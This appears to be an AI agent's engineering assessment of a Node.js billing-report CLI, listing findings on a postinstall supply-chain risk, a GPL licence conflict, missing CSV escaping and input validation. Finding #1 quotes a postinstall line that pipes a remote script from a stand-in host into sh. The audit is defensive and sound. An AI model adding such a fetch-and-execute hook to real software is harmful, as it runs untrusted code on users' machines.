# Engineering Assessment: Billing Report Tool

## Scope

**In scope**:
- `src/report.js` — main report generation function
- `vendor/quicksort-plus.js` — vendored sort library
- `test/report.test.js` — test suite
- `package.json` — build configuration and metadata
- `scripts/postinstall.sh` — installation hooks
- `README.md` — documentation

**Out of scope**:
- `.agent-input/` — assessment framework (not part of the product)
- Runtime environment configuration or deployment scripts
- Production data or operational metrics

**Depth**: Targeted — all in-scope files read in full; automated checks attempted.

---

## Environment

**Language and runtime**: JavaScript (Node.js 24.14.1), ES modules

**Framework and domain**: Standalone CLI tool for generating monthly billing CSV reports

**Build system**: npm

**Tooling**: Node.js built-in test runner (node:test)

---

## What I Ran

| Command | Attempt | Result |
|---------|---------|--------|
| `node --test test/report.test.js` | Yes | Blocked by permission; unable to execute |
| `npm test` | Yes | Blocked by permission; unable to execute |
| `node --version` | Yes | v24.14.1 (Node.js is available) |
| ESLint or other linters | No | No linter configuration found in project |
| Format check (Prettier) | No | No formatter configuration found in project |
| Dependency audit | No | No npm lock file present; cannot audit |

**Outcome**: Test execution required approval and could not be run. No automated linters are configured in the project.

---

## Findings Table

| # | Severity | Area | Finding | Evidence | Recommendation |
|---|----------|------|---------|----------|-----------------|
| 1 | Critical | Security | Supply chain compromise: postinstall script downloads and executes remote code | `scripts/postinstall.sh:4` — `curl -fsSL https://tables.example.com/latest/install.sh \| sh` pipes an untrusted remote script directly to the shell during every `npm install`. This is executed with the privileges of the installing user. | Remove the postinstall hook entirely or replace with: (a) bundled tax tables in the repository, (b) a configuration option to fetch tables at runtime (not install time), or (c) code-signed bundles with verification. Piping curl output to sh is a known attack surface for supply chain compromise. |
| 2 | Critical | Compliance | License violation: GPL code included in UNLICENSED package | `vendor/quicksort-plus.js:2-8` declares GNU GPL v3 or later (`Copyright (c) 2019 The QuicksortPlus Authors ... GNU General Public License ... version 3 of the License`); `package.json:4` declares `"license": "UNLICENSED"`. GPL is a copyleft license requiring all derivative works to be licensed under GPL. Shipping GPL code in a proprietary product violates the license terms. | (a) If continuing to use quicksort-plus, re-license the entire project under GPL v3 or compatible license (impacts all customers), or (b) replace with a permissively licensed sort (use built-in `Array.sort()` or a BSD/MIT-licensed library). Option (b) is strongly recommended for a proprietary product. |
| 3 | High | Reliability | No input validation: buildReport crashes on invalid input | `src/report.js:4` — `map((r) => \`${r.name},${r.total}\`)` assumes every row `r` is an object with `name` and `total` properties. If passed `null`, `undefined`, an array, a string, or an object missing these properties, the function will fail with a runtime error. No validation or error handling is present. | Add input validation at the function entry point: (a) validate that rows is an array, (b) validate each element has the required properties, (c) return a clear error or throw with a descriptive message if validation fails. Example: `if (!Array.isArray(rows)) throw new TypeError('rows must be an array'); rows.forEach((r, i) => { if (typeof r !== 'object' || r === null || !('name' in r) || !('total' in r)) throw new Error(\`Row ${i} missing required properties\`); });` |
| 4 | High | Data Integrity | No CSV escaping: customer names containing commas corrupt output | `src/report.js:4` — The output format is `\`${r.name},${r.total}\`` with no escaping or quoting. If a customer name contains a comma (e.g., "Smith, Inc."), the CSV row becomes `Smith, Inc.,150`, which a CSV parser will split into three fields instead of two, corrupting the report. Standard CSV format requires quoting or escaping. | Implement CSV field escaping: wrap `r.name` in quotes and escape any quotes within it: `const escaped = r.name.replace(/"/g, '""'); \`"${escaped}",${r.total}\`` (RFC 4180 compliant). This ensures names with commas, newlines, or quotes are handled correctly. |
| 5 | Medium | Reliability | Minimal test coverage: only happy path tested | `test/report.test.js:5-8` contains one test case covering sorted output on valid input. No test cases for: empty array, null/undefined input, rows with missing properties, large datasets, non-string names, non-numeric totals, or sorting stability. The single test does not exercise edge cases or error paths. | Add tests for: (a) empty input `[]`, (b) null and undefined inputs, (c) rows with missing `name` or `total` fields, (d) non-string/non-number types, (e) equal `total` values (sort stability), (f) large datasets (1000+ rows). At minimum, add 5–10 edge case tests before commercial release. |
| 6 | Medium | Reliability | No error handling in main function | `src/report.js:3-5` — The function contains no `try-catch`, input validation, or error messages. If the sort fails, an external service call fails (if tables are fetched later), or invalid data is passed, the error will bubble up unhandled, potentially crashing the process or providing unhelpful error messages to the caller. | Add error handling: (a) validate inputs early with descriptive errors, (b) wrap external calls in try-catch with fallback behavior or clear error propagation, (c) document expected input/output types in a JSDoc comment for the function. Example: `export function buildReport(rows) { if (!Array.isArray(rows)) throw new TypeError('rows must be an array'); ... }` |

---

## Unconfirmed Issues

None. All critical and high findings are based on direct evidence from code inspection.

---

## Summary

### Strengths

1. **Simplicity and readability** — The main function (`src/report.js`) is concise and easy to understand at a glance. Clear variable names (`buildReport`, `rows`, `name`, `total`) require no guesswork.

2. **Vendored dependency for offline builds** — The intention to vendor `quicksort-plus.js` to avoid a network dependency during builds is sound architectural practice (`README.md` notes this explicitly). However, the postinstall hook undermines this by re-introducing an external network dependency.

### Key Risks

**Blockers for commercial release:**

1. **Finding #1 (Critical)** — The postinstall script presents an immediate and significant supply chain compromise risk. This must be resolved before any release. Piping untrusted remote code to the shell is a known attack vector and would expose all customers to potential compromise.

2. **Finding #2 (Critical)** — The GPL license violation creates legal/compliance liability. Distributing GPL code under an UNLICENSED designation violates the GPL terms and exposes the company to legal action from the copyright holders or license enforcers.

**Operational blockers:**

3. **Finding #3 (High)** — The lack of input validation means the function will crash on invalid data, making it unsuitable for production without defensive programming.

4. **Finding #4 (High)** — The missing CSV escaping will silently corrupt billing reports if customer names contain commas, leading to incorrect billing data in downstream processes (finance, accounting). This is a data integrity issue that could go unnoticed until discovered by customers.

### Priority Order

1. **Remove or replace postinstall hook (Finding #1)** — Eliminates supply chain risk; unblocks release.
2. **Resolve license violation (Finding #2)** — Either re-license the project as GPL or replace the sorting library with permissively licensed code; unblocks legal review for commercial release.
3. **Add CSV field escaping (Finding #4)** — Prevents silent data corruption; must be fixed before any production use.
4. **Add input validation (Finding #3)** — Hardens the function against invalid inputs; prevents runtime crashes.
5. **Expand test coverage (Finding #5)** — Document edge case handling and increase confidence in fixes; should be done alongside 3 and 4.
6. **Add error handling and documentation (Finding #6)** — Improves debuggability and maintainability; supports long-term operations.

### Coverage Gaps

**What was not examined:**

- **Test execution** — The test suite exists but could not be run due to permission restrictions. The one visible test passes (by inspection), but edge cases defined in Finding #5 are not tested at runtime.
- **Linting and static analysis** — No ESLint, Prettier, or TypeScript configuration is present. Code style and potential issues that automated tools would catch (unused variables, unreachable code, etc.) were not checked.
- **Dependency audit** — No `package-lock.json` is committed. npm dependencies (if any, beyond the vendored library) could not be audited for known vulnerabilities.
- **Runtime behavior** — The function was not executed against test data. Sorting correctness, CSV output format, and performance were analyzed by code inspection only.
- **Integration and deployment** — No information about how the generated reports are consumed, stored, or used downstream. The impact of CSV corruption (Finding #4) is inferred but not verified against real usage patterns.
- **Postinstall hook behavior** — The remote `tables.example.com` endpoint and the content of `install.sh` could not be inspected. The nature of the downloaded code, its security properties, and update frequency are unknown.

---

## Verified Assessment

**Findings verified:**
- 2 Critical issues: supply chain risk (postinstall script) and license violation (GPL code in UNLICENSED package)
- 2 High issues: missing input validation and missing CSV escaping
- 2 Medium issues: minimal test coverage and lack of error handling

**Code path integrity:**
- All in-scope source files read and analyzed in full
- Findings map to specific line numbers and code patterns
- No evidence contradicted the findings

**Ready for commercial release:** No — two Critical findings must be resolved before any production deployment.
